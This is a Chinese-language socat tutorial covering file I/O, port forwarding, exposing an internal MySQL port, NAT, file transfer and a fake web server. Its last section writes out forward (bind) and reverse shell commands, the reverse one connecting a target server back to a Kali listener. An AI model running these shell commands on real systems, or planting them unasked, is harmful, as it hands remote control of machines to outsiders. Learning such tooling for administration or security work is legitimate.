# 1、背景介绍
socat，名字来源是socket cat，有点像 netcat，据说是 netcat 加强版，走瑞士军刀的路线。

它的核心作用就是，给两个数据源建立通道。支持众多协议和链接方式。

安装：
```text
 centos: yum install -y socat
 ubuntu: apt-get install -y socat
 macos:  brew install socat
```

# 2、基本语法
上面说了，socat 给两个数据源之间建立通道，这两个数据源就是 address1 和 address2：
```text
socat [options] address1 address2
```
address 可以是以下的数据源：
```text
1、-,STDIN,STDOUT 表示标准输入输出，可以就用一个横杠代替。
2、/var/log/syslog 打开一个文件作为数据流，可以是任意路径。
3、TCP:: 建立一个 TCP 连接作为数据流，TCP 也可以替换为 UDP 。
4、TCP-LISTEN: 建立 一个 TCP 监听端口，TCP 也可以替换为 UDP。
5、EXEC: 执行一个程序作为数据流。
```
btw：
```text
TCP 和 UDP 的区别就是 TCP-LISTEN 和 UDP-LISTEN，换个名字即可
```

# 3、文件操作
## 3.1、读文件
```text
绝对路径： socat - /tmp/123.txt
相对路径： socat - ./123.txt
```
注意：
```text
1、使用相对路径必须带 ./
2、- 就是标准输入输出的缩写，这里表示标准输出 STDOUT。
```
## 3.2、写文件
```text
echo "123" | socat - ./123.txt
```
注意：
```text
1、使用相对路径必须带 ./
2、- 就是标准输入输出的缩写，这里表示标准输入 STDIN。
```

# 4、网络管理
## 4.1、连接远程端口
```
假设我们已经提前监听了8888端口：
```text
nc -l 8888
```

连接远程端口：
```text
socat - tcp:127.0.0.1:8888
```
注意:
```text
- 表示 STDIN，通过 socat，我们可以把数据传输到远程 TCP 端口
```

## 4.2、本地监听一个新端口
监听本地 8888 端口：
```text
socat TCP-LISTEN:8888 -
```
注意：
```text
这里的-是 STDOUT，把连接到这个端口的数据打印到标准输出（控制台）
```
用 nc 来连接：
```text
nc 127.0.0.1 8888
```

## 4.3、转发
转发，直接上 demo：
```text
socat  -d -d -lf /var/log/socat.log TCP4-LISTEN:8888,bind=127.0.0.1,reuseaddr,fork TCP4:127.0.0.1:9999
```
参数解释：
```text
-d -d -lf /var/log/socat.log  两个-d 表示调试级别， -lf 表示存储输出信息的日志（lf 是 logfile 的意思）

TCP4-LISTEN:8888,bind=127.0.0.1,reuseaddr,fork  监听端口 8888，每次新的连接都 fork 一波，reuseaddr 表示重复使用端口（其实是处于 TIME_WAIT 状态的端口可以直接被重复使用，一般情况下TIME_WAIT都要等待 2MSL 的时间）

TCP4:127.0.0.1:9999  转到这个端口上
```

### 4.3.1、转发实操
开一个 TCP 监听端口，9999：
```text
nc -l 9999
```
创建一个转发管道：
```text
socat  -d -d -lf /var/log/socat.log TCP4-LISTEN:8888,bind=127.0.0.1,reuseaddr,fork TCP4:127.0.0.1:9999
```
我们来连接 8888 端口：
```text
nc 127.0.0.1 8888
```
发现我们发送给 8888 的数据，已经转到了 9999.

### 4.3.2、实际落地场景
内网有个 mysql 服务器，假设IP 是192.168.10.100，它是 3306 端口：
```text
nc -l 3306 # 模拟开了mysql
```
我们在一台能访问内网也能访问外网的服务器上，创建一个转发管道，假设它内网地址是 192.168.10.101，外网地址是 172.10.10.1：
```text
socat  -d -d -lf /var/log/socat.log TCP4-LISTEN:8888,bind=172.10.10.1,reuseaddr,fork TCP4:192.168.10.100:3306
```
那么我们直接在外网访问：
```text
nc 172.10.10.1 8888 
```
就等于我们直接访问了内网的mysql。


## 4.4、NAT
NAT 主要是把内网的端口放到公网上。

假设我们内网服务器是 192.168.10.100，外网服务器是：172.10.10.1.


内网：
```text
socat 172.10.10.1:1234 192.168.10.100:3306
```

外网：
```text
socat TCP-LISTEN:1234 TCP-LISTEN:3306
```

这样子我们访问外网的：`172.10.10.1:1234` 就等于内网的：`192.168.10.100:3306`。

ps:
```text
FRP: NAT 你这么溜了，那要我何用？
```

# 5、文件传递

## 5.1、文件传送
假设我们要传递文件：`123.txt`。

内网服务器 1(192.168.10.101)：
```text
socat -u open:123.txt tcp-listen:8888,reuseaddr
```

内网服务器 2(192.168.10.102)：
```text
socat -u tcp:192.168.10.101:8888 open:456.txt,create
```

ps:
```text
scp: 要我何用？
```

## 5.2、读写分离&假的WebServer

现在本地准备一个假的html: `123.html`。

开启假 webserver 的模式：
```text
socat open:123.html\!\!open:write.txt,create,append tcp-listen:8000,reuseaddr,fork
```
wget 下：
```text
# wget http://127.0.0.1:8000                                                                                                                                                          ✔  10100  12:06:20
--2023-02-13 12:06:40--  http://127.0.0.1:8000/
Connecting to 127.0.0.1:8000... connected.
HTTP request sent, awaiting response... 200 No headers, assuming HTTP/0.9
Length: unspecified
Saving to: 'index.html.4'

index.html.4                                                      [ <=>                                                                                                                                           ]       4  --.-KB/s    in 0s

2023-02-13 12:06:40 (651 KB/s) - 'index.htm' saved [4]
```

# 6、正反向 shell
## 6.1、正向 shell
server 上建立一个 shell：
```text
$ socat TCP-LISTEN:7005,fork,reuseaddr EXEC:/bin/bash,pty,stderr
或者
$ socat TCP-LISTEN:7005,fork,reuseaddr system:bash,pty,stderr
```

client 上连接这个 shell：
```text
socat - tcp:127.0.0.1:7005
或者
socat readline tcp:127.0.0.1:7005  # readline 是 GNU 的命令行编辑器，具有历史功能。
```


## 6.2、反弹 shell
在 kali 上监听 7005 端口，等着 target 机器来连接：
```text
socat -,raw,echo=0 tcp-listen:7005
```
在 target 服务器上连接：
```text
socat tcp-connect:10.1.96.8:7005 exec:'bash -li',pty,stderr,setsid,sigint,sane
```
结果：
```text
在 kali 上可以看到我们拿到了 target 服务器的 shell。
说实话，反弹的意思是，让 target 来反向给我们 kali 的 shell，这个名字起得真好。
```

# 7、参考链接
* [What actually reuseaddr option does in socat?](https://stackoverflow.com/questions/75059280/what-actually-reuseaddr-option-does-in-socat)
* [奇妙的linux世界：Socat 入门教程](https://mp.weixin.qq.com/s/96GQcFN_Avjfu1zvJDVEyg)